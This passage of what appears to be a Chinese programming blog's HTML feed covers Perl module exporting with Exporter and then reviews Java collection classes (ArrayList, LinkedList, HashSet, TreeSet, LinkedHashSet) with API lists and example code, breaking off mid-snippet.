class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">package Caterpillar;</span><br><span class="line"></span><br><span class="line"># 继承自Exporter</span><br><span class="line">use parent (&quot;Exporter&quot;);</span><br><span class="line"></span><br><span class="line">sub crawl  &#123; print &quot;inch inch&quot;;   &#125;</span><br><span class="line">sub eat    &#123; print &quot;chomp chomp&quot;; &#125;</span><br><span class="line">sub pupate &#123; print &quot;bloop bloop&quot;; &#125;</span><br><span class="line"></span><br><span class="line">our @EXPORT_OK &#x3D; (&quot;crawl&quot;, &quot;eat&quot;);</span><br><span class="line"></span><br><span class="line">return 1;</span><br></pre></td></tr></table></figure><p>包变量<code>@EXPORT_OK</code>应该包含子程序名字的列表。</p><p>另一块代码就可以通过名字来<code>import()</code>这些子程序，一般使用<code>use</code>语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line">use Caterpillar (&quot;crawl&quot;);</span><br><span class="line"></span><br><span class="line">crawl(); # &quot;inch inch&quot;</span><br></pre></td></tr></table></figure><p>在这种情况下，当前包是<code>main</code>所以<code>crawl()</code>实际上是调用了<code>main::crawl()</code>，（因为被导入了）映射到<code>Caterpillar::crawl()</code>。</p><p>注意：不管<code>@EXPORT_OK</code>的内容是什么，通过“常规写法”使用这些函数总是可以的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line">use Caterpillar (); # 没有提供任何子程序名，import()不会被调用</span><br><span class="line"></span><br><span class="line"># 然而……</span><br><span class="line">Caterpillar::crawl();  # &quot;inch inch&quot;</span><br><span class="line">Caterpillar::eat();    # &quot;chomp chomp&quot;</span><br><span class="line">Caterpillar::pupate(); # &quot;bloop bloop&quot;</span><br></pre></td></tr></table></figure><p>Perl没有私有方法，习惯上在希望私有的方法名前面有一个或者两个下划线。</p><h4 id="EXPORT"><a href="#EXPORT" class="headerlink" title="@EXPORT"></a><code>@EXPORT</code></h4><p>Exporter模块还定义了一个包变量叫<code>@EXPORT</code>，也包含一组子程序名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">package Caterpillar;</span><br><span class="line"></span><br><span class="line"># 继承自Exporter</span><br><span class="line">use parent (&quot;Exporter&quot;);</span><br><span class="line"></span><br><span class="line">sub crawl  &#123; print &quot;inch inch&quot;;   &#125;</span><br><span class="line">sub eat    &#123; print &quot;chomp chomp&quot;; &#125;</span><br><span class="line">sub pupate &#123; print &quot;bloop bloop&quot;; &#125;</span><br><span class="line"></span><br><span class="line">our @EXPORT &#x3D; (&quot;crawl&quot;, &quot;eat&quot;, &quot;pupate&quot;);</span><br><span class="line"></span><br><span class="line">return 1;</span><br></pre></td></tr></table></figure><p>如果没有给<code>import()</code>传入任何参数，<code>@EXPORT</code>中写出的子程序将全部被导出，就像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line">use Caterpillar; # 调用import()但不提供参数</span><br><span class="line"></span><br><span class="line">crawl();  # &quot;inch inch&quot;</span><br><span class="line">eat();    # &quot;chomp chomp&quot;</span><br><span class="line">pupate(); # &quot;bloop bloop&quot;</span><br></pre></td></tr></table></figure><p>不过我们又回到了那种情况，没有其他提示的话，我们很难知道<code>crawl()</code>原先是在哪儿定义的。这件事情有两个寓意：</p><ol><li>当我们用Exporter创建模块的时候，不要用<code>@EXPORT</code>来导出子程序，总是让调用者以“常规方法”调用子程序，或者显式地<code>import()</code>它们（使用比如：<code>use Caterpillar (&quot;crawl&quot;)</code>提供了一条很强的线索，告诉我们可以从<code>Caterpillar.pm</code>中找到<code>crawl()</code>的定义）。</li><li>当<code>use</code>一个使用Exporter的模块时，总是显式写明你希望<code>import()</code>的子程序，如果你不想<code>import()</code>任何子程序，而是用常规方法引用它们，你必须显式提供一个空的列表：<code>use Caterpillar ()</code>。</li></ol><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ul><li><p>核心模块<a href="http://perldoc.perl.org/Data/Dumper.html" target="_blank" rel="noopener">Data::Dumper</a>可以被用于输出任意scalar到屏幕上，这是非常有用的调试工具。</p></li><li><p>还有另一种语法<code>qw{ }</code>可以用来声明array，常常在<code>use</code>语句用到它：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use Account qw&#123;create open close suspend delete&#125;;</span><br></pre></td></tr></table></figure><p>有<a href="http://perldoc.perl.org/perlop.html#Quote-and-Quote-like-Operators" target="_blank" rel="noopener">许多引号一样的运算符</a>。</p></li><li><p>在<code>=~ m//</code>和<code>=~ s///</code>运算符中，你可以用花括号代替斜杠作为正则表达式的分隔符，当你的正则表达式中包含很多斜杠时候就很有用了，要不然你就得使用很多反斜杠来进行跳脱。例如，<code>=~ m{///}</code>将匹配三个斜杠而<code>=~ s{^https?://}{}</code>会移除URL的协议部分。</p></li><li><p>Perl没有<code>CONSTANTS</code>。现在不鼓励使用它们，不过以前不一定。常量实际上就是省略括号的子程序调用。</p></li><li><p>有时候人们省略hash键两旁的引号，写成<code>$hash{key}</code>而非<code>$hash{&quot;key&quot;}</code>。 当这个孤零零的<code>key</code>恰好表示字符串<code>&quot;key&quot;</code>而不是子程序调用<code>key()</code>的时候，它们才能侥幸成功。</p></li><li><p>如果你看到一块由两个左尖括号作为分隔符包围起来的没有格式化的代码，就像<code>&lt;&lt;EOF</code>，可以通过在Google中搜索“here-doc”找到它的解释。（译者注：这是再一次吐槽因为Perl滥用符号导致难以搜索。）</p></li><li><p>警告！许多内置函数调用时都可以不给参数，<strong>那样它们就会使用<code>$_</code>代替</strong>，希望这可以帮助你理解下面这种写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print foreach @array;</span><br></pre></td></tr></table></figure><p>还有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach ( @array ) &#123;</span><br><span class="line">next unless defined;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我不喜欢这种写法，因为在代码重构时将会遇到麻烦。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> perl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> perl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA集合复习-实现类</title>
      <link href="/2020/12/04/javajihe_shixian/"/>
      <url>/2020/12/04/javajihe_shixian/</url>
      
        <content type="html"><![CDATA[<blockquote><p>java集合实现类</p></blockquote><a id="more"></a><h2 id="实现类"><a href="#实现类" class="headerlink" title="实现类"></a>实现类</h2><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201206143044445.png" alt="image-20201206143044445"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201206143100897.png" alt="image-20201206143100897"></p><h3 id="arraylist"><a href="#arraylist" class="headerlink" title="arraylist"></a>arraylist</h3><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201204164857368.png" alt="image-20201204164857368"></p><p>主要继承的接口如下：</p><p>1.<strong>Collection 接口：</strong> Collection接口是所有集合类的根节点，Collection表示一种规则，所有实现了Collection接口的类遵循这种规则</p><p>2.<strong>List 接口：</strong> List是Collection的子接口，它是一个元素有序(按照插入的顺序维护元素顺序)、可重复、可以为null的集合</p><p>3.<strong>AbstractCollection 类：</strong> Collection接口的骨架实现类，最小化实现了Collection接口所需要实现的工作量</p><p>4.<strong>AbstractList 类：</strong> List接口的骨架实现类，最小化实现了List接口所需要实现的工作量</p><p>5.<strong>Cloneable 接口：</strong> 实现了该接口的类可以显示的调用Object.clone()方法，合法的对该类实例进行字段复制，如果没有实现Cloneable接口的实例上调用Obejct.clone()方法，会抛出CloneNotSupportException异常。正常情况下，实现了Cloneable接口的类会以公共方法重写Object.clone()</p><p>6.<strong>Serializable 接口：</strong> 实现了该接口标示了类可以被序列化和反序列化，具体的 <a href="https://www.jianshu.com/p/0ca21d2acd7c" target="_blank" rel="noopener">查询序列化详解</a></p><p>7.<strong>RandomAccess 接口：</strong> 实现了该接口的类支持快速随机访问</p><p>以数组实现。节约空间，但数组有容量限制。超出限制时会增加50%容量，用System.arraycopy()复制到新的数组，因此最好能给出数组大小的预估值。默认第一次插入元素时创建大小为10的数组。<br>  按照数组索引访问元素：get(int index)/set(int index)的性能很高，这是数组的优势。直接在数组末尾加入元素：add(e)的性能也高，但如果按索引插入、删除元素：add(i,e)、remove(i)、remove(e)，则要用System.arraycopy()来移动部分受影响的元素，性能就变差了，这是数组的劣势。<br>  ArrayList是线程不安全的，只能在单线程环境下，多线程环境下可以考虑用Collections.synchronizedList(List list)方法返回一个线程安全的ArrayList对象，也可以使用concurrent并发包下的CopyOnWriteArrayList类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">add(a); <span class="comment">//增加元素</span></span><br><span class="line">add(index,a) <span class="comment">//指定位置增加元素</span></span><br><span class="line">contains()<span class="comment">//判断元素是否存在</span></span><br><span class="line">get(index)<span class="comment">//获取指定位置的对象</span></span><br><span class="line">indexOf()<span class="comment">//获取对象所处的位置</span></span><br><span class="line">remove()<span class="comment">//删除,可以根据下标，也可以根据对象删除</span></span><br><span class="line">set(index,a)<span class="comment">//替换</span></span><br><span class="line">size()<span class="comment">//获取大小</span></span><br><span class="line">toArray()<span class="comment">//转换为数组,需要传入一个对应类型的数组，否则只能返回Object数组</span></span><br><span class="line">addAll(anotherlist)<span class="comment">//把另一个容器所有对象都加进来</span></span><br><span class="line">clear()<span class="comment">//清空</span></span><br><span class="line">List&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">a</span> </span>= <span class="keyword">new</span> ArrayList&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;()</span>;</span><br><span class="line"><span class="comment">//遍历</span></span><br><span class="line"><span class="comment">//for循环</span></span><br><span class="line"><span class="comment">//foreach</span></span><br><span class="line"><span class="comment">//迭代器</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; heros.size(); i++) &#123;</span><br><span class="line">Hero h = heros.get(i);</span><br><span class="line">System.out.println(h);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line">Hero h = it.next();</span><br><span class="line">System.out.println(h);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (Iterator&lt;Hero&gt; iterator = heros.iterator(); iterator.hasNext();) &#123;</span><br><span class="line">Hero hero = (Hero) iterator.next();</span><br><span class="line">System.out.println(hero);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (Hero h : heros) &#123;</span><br><span class="line">System.out.println(h);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//双向迭代器</span></span><br><span class="line">List list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        list.add(<span class="string">"0"</span>);</span><br><span class="line">        list.add(<span class="string">"1"</span>);</span><br><span class="line">        list.add(<span class="string">"2"</span>);</span><br><span class="line">        list.add(<span class="string">"3"</span>);</span><br><span class="line">        ListIterator iterator = list.listIterator();</span><br><span class="line">        System.out.println(<span class="string">"--------------------向下遍历--------------------"</span>);</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">int</span> nextIndex = iterator.nextIndex();</span><br><span class="line">            String next = (String) iterator.next();</span><br><span class="line">            <span class="comment">//int previousIndex = iterator.previousIndex();</span></span><br><span class="line">            System.out.println(<span class="string">"当前元素："</span>+next+<span class="string">"，当前元素索引："</span>+nextIndex<span class="comment">/*+"，前一个元素的索引"+previousIndex*/</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"--------------------向上遍历--------------------"</span>);</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasPrevious()) &#123;</span><br><span class="line">            <span class="keyword">int</span> previousIndex = iterator.previousIndex();</span><br><span class="line">            String previous = (String) iterator.previous();</span><br><span class="line">            System.out.println(<span class="string">"当前元素："</span>+previous+<span class="string">"，当前元素索引："</span>+previousIndex);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="linkedlist"><a href="#linkedlist" class="headerlink" title="linkedlist"></a>linkedlist</h3><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201204175251221.png" alt="image-20201204175251221"></p><p>1.<strong>Collection 接口：</strong> Collection接口是所有集合类的根节点，Collection表示一种规则，所有实现了Collection接口的类遵循这种规则</p><p>2.<strong>List 接口：</strong> List是Collection的子接口，它是一个元素有序(按照插入的顺序维护元素顺序)、可重复、可以为null的集合</p><p>3.<strong>AbstractCollection 类：</strong> Collection接口的骨架实现类，最小化实现了Collection接口所需要实现的工作量</p><p>4.<strong>AbstractList 类：</strong> List接口的骨架实现类，最小化实现了List接口所需要实现的工作量</p><p>5.<strong>Cloneable 接口：</strong> 实现了该接口的类可以显示的调用Object.clone()方法，合法的对该类实例进行字段复制，如果没有实现Cloneable接口的实例上调用Obejct.clone()方法，会抛出CloneNotSupportException异常。正常情况下，实现了Cloneable接口的类会以公共方法重写Object.clone()</p><p>6.<strong>Serializable 接口：</strong> 实现了该接口标示了类可以被序列化和反序列化，具体的 <a href="https://www.jianshu.com/p/0ca21d2acd7c" target="_blank" rel="noopener">查询序列化详解</a></p><p>7.<strong>Deque 接口：</strong> Deque定义了一个线性Collection，支持在两端插入和删除元素，Deque实际是“double ended queue(双端队列)”的简称，大多数Deque接口的实现都不会限制元素的数量，但是这个队列既支持有容量限制的实现，也支持没有容量限制的实现，比如LinkedList就是有容量限制的实现,其最大的容量为Integer.MAX_VALUE</p><p>8.<strong>AbstractSequentialList 类：</strong> 提供了List接口的骨干实现，最大限度地减少了实现受“连续访问”数据存储(如链表)支持的此接口所需的工作，对于随机访问数据(如数组)，应该优先使用 AbstractList，而不是使用AbstractSequentailList类</p><blockquote><p>• LinkedList()<br>构造一个空链表。<br>• LinkedList(Col 1ection&lt;? extends E&gt; elements)<br>构造一个链表， 并将集合中所有的元素添加到这个链表中。<br>• void addFirst(E element)<br>• void addLast(E element)<br>将某个元素添加到列表的头部或尾部。<br>• E getFirst()<br>• E getLast()<br>返回列表头部或尾部的元素。<br>• E removeFirst()<br>• E removeLast()<br>删除并返回列表头部或尾部的元素。</p></blockquote><p><strong>和arraylist比较</strong></p><ul><li>相同点</li></ul><p>1.接口实现：都实现了List接口，都是线性列表的实现</p><p>2.线程安全：都是线程不安全的</p><ul><li>不同点</li></ul><p>1.底层实现:ArrayList内部是数组实现，而LinkedList内部实现是双向链表结构</p><p>2.接口实现：ArrayList实现了RandomAccess可以支持随机元素访问，而LinkedList实现了Deque可以当做队列使用</p><p>3.性能：新增、删除元素时ArrayList需要使用到拷贝原数组，而LinkedList只需移动指针，查找元素 ArrayList支持随机元素访问,而LinkedList只能一个节点的去遍历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.ListIterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedListApi</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">LinkedList&lt;String&gt; linkedList = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">linkedList.add(<span class="string">"D"</span>);</span><br><span class="line">linkedList.add(<span class="string">"E"</span>);</span><br><span class="line">linkedList.add(<span class="string">"G"</span>);</span><br><span class="line">linkedList.add(<span class="string">"A"</span>);</span><br><span class="line">linkedList.add(<span class="string">"H"</span>);</span><br><span class="line">System.out.println(linkedList); <span class="comment">//[D, E, G, A, H]</span></span><br><span class="line">LinkedList&lt;String&gt; linkedList2 = <span class="keyword">new</span> LinkedList&lt;&gt;(linkedList); <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">String key;</span><br><span class="line">key = linkedList.getFirst(); <span class="comment">// 取表头</span></span><br><span class="line">key = linkedList.getLast();  <span class="comment">// 取表尾</span></span><br><span class="line">key = linkedList.get(<span class="number">2</span>); <span class="comment">// 取index = 2</span></span><br><span class="line">key = linkedList.peek(); <span class="comment">// 取表头</span></span><br><span class="line">key = linkedList.peekFirst(); <span class="comment">// 取表头</span></span><br><span class="line">key = linkedList.peekLast(); <span class="comment">// 取表尾</span></span><br><span class="line"><span class="keyword">boolean</span> b = linkedList.remove(<span class="string">"G"</span>); <span class="comment">// 删除第一个给定元素 删除返回true</span></span><br><span class="line">key = linkedList.remove(<span class="number">3</span>); <span class="comment">// 删除index = 3 返回删除元素</span></span><br><span class="line">key = linkedList.remove();  <span class="comment">// 删除表头 返回删除元素</span></span><br><span class="line">key = linkedList.removeFirst();  <span class="comment">// 删除表头 返回表头</span></span><br><span class="line">key = linkedList.removeLast();  <span class="comment">// 删除表尾返回表尾</span></span><br><span class="line">key = linkedList.poll(); <span class="comment">// 删除表头返回 表头</span></span><br><span class="line">key = linkedList.pollFirst(); <span class="comment">// 删除表头返回 表头</span></span><br><span class="line">key = linkedList.pollLast(); <span class="comment">// 删除表尾 返回表尾</span></span><br><span class="line">linkedList.push(<span class="string">"44"</span>); <span class="comment">// addFirst</span></span><br><span class="line">linkedList.addFirst(<span class="string">"3"</span>); <span class="comment">// 表头增加元素</span></span><br><span class="line">linkedList.addLast(<span class="string">"7"</span>); <span class="comment">// 表尾增加元素</span></span><br><span class="line">b = linkedList.contains(<span class="string">"E"</span>); <span class="comment">// 包含返回true</span></span><br><span class="line"><span class="keyword">int</span> n = linkedList.size(); <span class="comment">// 元素count</span></span><br><span class="line">b = linkedList.addAll(linkedList2); <span class="comment">// 成功返回true</span></span><br><span class="line">System.out.println(linkedList); <span class="comment">// [3, 44, 7, D, E, G, A, H]</span></span><br><span class="line">b = linkedList.addAll(<span class="number">3</span>, linkedList2); <span class="comment">// 从index = 3 增加</span></span><br><span class="line">System.out.println(linkedList);</span><br><span class="line">linkedList.clear(); <span class="comment">//清空</span></span><br><span class="line">key = linkedList.set(<span class="number">4</span>, <span class="string">"EE"</span>); <span class="comment">// 设定指定index 的值</span></span><br><span class="line">System.out.println(key);</span><br><span class="line">b = linkedList.offer(<span class="string">"3"</span>);  <span class="comment">// add</span></span><br><span class="line">b = linkedList.offerFirst(<span class="string">"77"</span>); <span class="comment">//addFirst </span></span><br><span class="line">b = linkedList.offerLast(<span class="string">"22"</span>);   <span class="comment">// addLast</span></span><br><span class="line">b = linkedList.removeFirstOccurrence(<span class="string">"E"</span>); <span class="comment">// remove("E")</span></span><br><span class="line">b = linkedList.removeLastOccurrence(<span class="string">"3"</span>); <span class="comment">// 删除最后一个</span></span><br><span class="line"></span><br><span class="line">n = linkedList.indexOf(<span class="string">"E"</span>); <span class="comment">// 第一次出现的位置index</span></span><br><span class="line">n = linkedList.lastIndexOf(<span class="string">"G"</span>); <span class="comment">// 最后一次出现的位置index</span></span><br><span class="line"></span><br><span class="line">System.out.println(linkedList); <span class="comment">// [77, 3, 44, 7, D, EE, G, A, H, D, G, A, H, 22]</span></span><br><span class="line">ListIterator&lt;String&gt; listIterator = linkedList.listIterator(); <span class="comment">// 正向迭代器</span></span><br><span class="line"><span class="keyword">while</span> (listIterator.hasNext()) &#123;</span><br><span class="line">String string = listIterator.next();</span><br><span class="line"><span class="comment">//System.out.println(string); //D, EE, G, A, H, D, G, A, H, 22]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (listIterator.hasPrevious()) &#123;  <span class="comment">//反向迭代</span></span><br><span class="line">String string = listIterator.previous();</span><br><span class="line"><span class="comment">//System.out.println(string); </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Object[] objects = linkedList.toArray(); <span class="comment">// 转为对象数组</span></span><br><span class="line">String[] strings = <span class="keyword">new</span> String[<span class="number">1</span>];</span><br><span class="line">strings = linkedList.toArray(strings); <span class="comment">// 转为数组</span></span><br><span class="line">Object object = linkedList.clone(); <span class="comment">// 浅拷贝</span></span><br><span class="line"></span><br><span class="line">linkedList.add(<span class="number">3</span>, <span class="string">"EE"</span>);</span><br><span class="line">System.out.println(linkedList);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="hashset"><a href="#hashset" class="headerlink" title="hashset"></a>hashset</h3><p>默认桶数是16，装填因子是0.75.</p><p>在 JavaSE 8 中， 桶满时会从链表变为平衡二叉树。如果选择的散列函数不当， 会<br>产生很多冲突， 或者如果有恶意代码试图在散列表中填充多个有相同散列码的值， 这样<br>就能提高性能。</p><blockquote><p>import java.Iang.Object</p><p>int hashCode( )<br>返回这个对象的散列码。 散列码可以是任何整数， 包括正数或负数。equals 和 hashCode<br>的定义必须兼容，即如果 x.equals(y) 为 true, x.hashCodeO 必须等于 y.hashCodeO。</p></blockquote><blockquote><p>• HashSet( )<br>构造一个空散列表。<br>• HashSet( Collection&lt;? extends E&gt; elements )<br>构造一个散列集， 并将集合中的所有元素添加到这个散列集中。<br>• HashSet( int initialCapacity)<br>构造一个空的具有指定容量（桶数）的散列集。<br>• HashSet(int initialCapacity , float loadFactor )<br>构造一个具有指定容量和装填因子（一个 0.0 ~ 1.0 之间的数值， 确定散列表填充的百分比， 当大于这个百分比时， 散列表进行再散列）的空散列集。</p></blockquote><h3 id="treeset"><a href="#treeset" class="headerlink" title="treeset"></a>treeset</h3><p>实现 Comparable 接口和NavigableSet 接口，使用红黑树排序，有序集合。</p><p>将一个元素添加到树中要比添加到散列表中慢， 参见表 9-3 中的比较，但是， 与检查数<br>组或链表中的重复元素相比还是快很多。如果树中包含 n 个元素， 査找新元素的正确位置平<br>均需要 logn 次比较。 例如， 如果一棵树包含了 1000 个元素，添加一个新元素大约需要比较<br>10 次。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201206174559534.png" alt="image-20201206174559534"></p><blockquote><p>• TreeSet()<br>• TreeSet(Comparator&lt;? super E&gt; comparator)<br>构造一个空树集。<br>• TreeSet(Collection&lt;? extends E&gt; elements)<br>• TreeSet(SortedSet<E> s)<br>构造一个树集， 并增加一个集合或有序集中的所有元素（对于后一种情况， 要使用同样的顺序)。</p></blockquote><blockquote><p>NavigableSet 接口</p><p>• E higher(E value)<br>• E lower(E value)<br>返回大于 value 的最小元素或小于 value 的最大元素，如果没有这样的元素则返回 null。<br>• E ceiling(E value)<br>• E floor(E value)<br>返回大于等于 vaiue 的最小元素或小于等于 value 的最大元素， 如果没有这样的元素<br>则返回 null。<br>• E pollFirst()<br>• E pollLast<br>删除并返回这个集中的最大元素或最小元素， 这个集为空时返回 null。<br>• Iterator<E> descendingIterator()<br>返回一个按照递减顺序遍历集中元素的迭代器。</p></blockquote><blockquote><p>SortedSet 接口</p><p>• Comparator &lt;? super E&gt; comparator ()<br>返回用于对元素进行排序的比较器。 如果元素用 Comparable 接口的 compareTo方法进行比较则返回 null。<br>• E firs()<br>• E 1ast()<br>返回有序集中的最小元素或最大元素。</p></blockquote><h3 id="linkedhashset"><a href="#linkedhashset" class="headerlink" title="linkedhashset"></a>linkedhashset</h3><p>用来记住插人元素项的顺序。这样就可以避免在散列表中的项从表面上看是随机排列的。当条目插入到表中时，就会并人到双向链表中。和linkedhashmap类似……</p><p>链接散列映射将用访问顺序， 而不是插入顺序， 对映射条目进行迭代。每次调用 get 或 put, 受到影响的条目将从当前的位置删除， 并放到条目链表的尾部（只有条目在链表中的位置会受影响， 而散列表中的桶不会受影响。一个条目总位于与键散列码对应的桶中）。要项构造这样一个的散列映射表， 请调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashMap&lt;K, V&gt;(initialCapacity, loadFactor, <span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>访问顺序对于实现高速缓存的“ 最近最少使用” 原则十分重要。例如， 可能希望将访问<br>频率高的元素放在内存中， 而访问频率低的元素则从数据库中读取。当在表中找不到元素项<br>且表又已经满时， 可以将迭代器加入到表中， 并将枚举的前几个元素删除掉。这些是近期最<br>少使用的几个元素。<br>甚至可以让这一过程自动化。即构造一个<code>LinkedHashMap</code> 的子类，然后覆盖下面这个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">removeEldestEntry</span><span class="params">(Map.Entry&lt;K， V&gt; eldest)</span></span></span><br></pre></td></tr></table></figure><p>每当方法返回 <code>true</code> 时， 就添加一个新条目，从而导致删除 <code>eldest</code> 条目。例如，下面的高<br>速缓存可以存放 100 个元素：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;K, V&gt; cache = <span class="keyword">new</span></span><br><span class="line">  LinkedHashMap&lt;&gt;(<span class="number">128</span>, <span class="number">0.75F</span>, <span class="keyword">true</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">removeEldestEntry</span><span 